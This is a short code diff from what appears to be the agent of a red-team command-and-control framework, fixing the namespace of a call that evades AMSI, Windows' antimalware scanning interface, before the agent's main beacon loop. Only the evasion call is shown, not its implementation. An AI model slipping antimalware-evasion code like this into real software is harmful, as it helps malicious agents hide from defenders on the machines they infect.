@@ -70,7 +70,7 @@ public class RedPeanutRP
         string agentidrequesttemplate = new JavaScriptSerializer().Serialize(agentIdReqMsg);
         bool agentexit = false;
 
-        RedPeanutAgent.Evasion.Evade(amsievasion);
+        RedPeanutAgent.Evasion.Evasion.Evade(amsievasion);
 
         while (true && !agentexit)
         {
